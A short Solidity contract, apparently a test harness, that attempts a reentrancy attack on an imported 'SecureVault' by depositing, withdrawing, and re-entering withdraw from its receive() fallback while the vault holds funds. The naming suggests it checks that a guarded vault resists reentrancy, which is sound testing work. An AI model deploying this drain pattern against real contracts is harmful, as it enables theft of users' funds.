// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./SecureVaultGuard.sol";
contract SecureCEIAttacker {
    SecureVault public vault;
    uint256 public attackAmount;
    constructor(address _vault, uint256 _attackAmount) {
        vault = SecureVault(_vault);
        attackAmount = _attackAmount;
    }
    function attack() external payable {
        require(msg.value >= attackAmount, "Invalid Amount");
        vault.deposit{value: attackAmount}();
        vault.withdraw();
    }
    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }

    }